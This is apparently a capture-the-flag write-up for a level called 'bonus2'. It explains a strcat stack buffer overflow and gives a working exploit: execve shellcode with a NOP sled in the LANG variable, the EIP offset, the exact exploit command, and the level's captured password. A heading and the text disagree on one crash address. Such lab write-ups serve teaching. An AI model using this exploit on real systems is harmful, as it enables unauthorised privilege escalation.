# bonus2

This challenge highlights the danger of unsafe string concatenation functions like `strcat` and demonstrates how environment variables can be leveraged to execute code when input buffers are heavily size-restricted.

### Code Analysis

Based on the decompiled code, the binary is divided into two primary functions: `main` and `greetuser`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int language = 0; // 0 = English, 1 = Finnish, 2 = Dutch

void greetuser(const char *username) {
    char greeting[128]; 

    if (language == 1) {
        strcpy(greeting, "Hyvää päivää ");
    } 
    else if (language == 2) {
        strcpy(greeting, "Goedemiddag! ");
    } 
    else {
        strcpy(greeting, "Hello ");
    }

    strcat(greeting, username);
    puts(greeting);
}

int main(int argc, char *argv[]) {
    char user_data[76]; 
    char *lang_env;

    if (argc == 3) {
        memset(user_data, 0, sizeof(user_data));

        strncpy(user_data, argv[1], 40);
        strncpy(user_data + 40, argv[2], 32);

        lang_env = getenv("LANG");
        if (lang_env != NULL) {
            if (memcmp(lang_env, "fi", 2) == 0) {
                language = 1;
            } else if (memcmp(lang_env, "nl", 2) == 0) {
                language = 2;
            }
        }

        greetuser(user_data);
        return 0;
    } 
    
    return 1;
}
```

#### Inside `main()`
- Allocates a stack buffer `user_data` of 76 bytes.
- Copies up to 40 bytes from `argv[1]` and up to 32 bytes from `argv[2]` into `user_data` using `strncpy`.
- Reads the `LANG` environment variable. If it matches `"fi"`, sets the language flag to 1. If it matches `"nl"`, sets it to 2.
- Passes `user_data` to `greetuser()`.

#### Inside `greetuser()`
- Allocates a local stack buffer `greeting` of 128 bytes (which actually gets compiled as 64 bytes in local memory due to alignment).
- Uses `strcpy` to copy a static language greeting into this buffer:
  - Default (English): `"Hello "` (6 bytes)
  - `LANG=fi` (Finnish): `"Hyvää päivää "` (13 bytes)
  - `LANG=nl` (Dutch): `"Goedemiddag! "` (13 bytes)
- **Vulnerability**: It executes `strcat(greeting, username)` to concatenate our combined 72-byte `user_data` to the static greeting buffer without bounds checking.
- Because `13 bytes (greeting) + 72 bytes (input) = 85 bytes`, this completely overflows the 64-byte destination buffer, overwriting the saved instruction pointer (EIP).

---

### The Debugging Journey

#### Analysis of Initial Missteps

1. **The Half-Corrupted EIP (0x08006241)**:
   When running the cyclic pattern through both arguments with `LANG` unset, the binary crashed at `0x08046241` (decoding to `Ab` plus a null byte).
   - **Why it happened**: With `LANG` unset, the program defaults to `"Hello "` (6 bytes). Our inputs filled the buffer, overwrote EBP with `8Aa9`, but ran out of length before fully engulfing the 4-byte EIP. `strcat` dropped its trailing null byte `\x00` into the middle of the EIP register, truncating the address.
   - **The Lesson**: We cannot reliably overwrite the EIP on the default English track because the greeting is too short to push our limited 72-byte input deep enough into the stack frame.

2. **Shifting Patterns across Arrays**:
   In initial tests, pasting the cyclic pattern into both `argv[1]` and `argv[2]` was confusing because `main` handles them separately (capping `argv[1]` at 40 and `argv[2]` at 32).
   - **The Fix**: We isolate the test by filling `argv[1]` with 40 `"a"` characters as padding. This means any pattern bytes found crashing the EIP are purely relative to the start of `argv[2]`.

---

### Exploit Strategy & Mechanics

Because `argv[2]` is capped at 32 bytes, we cannot fit a standard NOP sled and shellcode directly in it. Instead, we inject our shellcode into the `LANG` environment variable.

#### Step 1: The Environment Variable Sled
Environment variables reside at the top of the stack when the program starts. We inject our 21-byte shellcode directly into `LANG`, prepended by a 100-byte NOP sled, starting the string with `"nl"` to satisfy the language check:
```bash
export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

#### Step 2: Shifting the Offset Matrix
Setting `LANG=nl` causes the binary to use the `"Goedemiddag! "` (13-byte) greeting. This longer prefix pushes our input 7 bytes further down the stack frame.

Running our pattern test with `LANG=nl` causes the EIP register to crash at `0x38614137` (little-endian: `37 41 61 38` -> `7Aa8`).
Counting the distance to `7Aa8` from the beginning of `argv[2]` confirms the exact offset to EIP is **23** bytes.

#### Memory Layout
- **Greeting**: `"Goedemiddag! "` (13 bytes)
- **`argv[1]`**: Static `"a"` padding (40 bytes)
- **`argv[2]`**: Padding to EIP (23 bytes)
- **Total distance to EIP**: `13 + 40 + 23 = 76` bytes.

---

### Exploit Execution

With the offset locked at 23 bytes, we inspect the environment pointers in GDB:
```text
(gdb) x/20s *((char**)environ)
...
0xbffffebc:	 "LANG=nl\220\220\220\220..."
```

Adding a safety offset to land past the `"nl"` characters and deep inside the middle of our 100-byte NOP sled, we target the address `0xbffffee0`.

Reversing this address into little-endian format using `[::-1]`, we run the exploit:
```bash
./bonus2 $(python -c 'print "a"*40') $(python -c 'print "B"*23 + "\xbf\xff\xfe\xe0"[::-1]')
```

This overwrites EIP with `0xbffffee0`. When `greetuser` returns, execution jumps to our NOP sled in the `LANG` environment variable, slides down, and executes the shellcode, granting us a shell as `bonus3`:
```bash
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
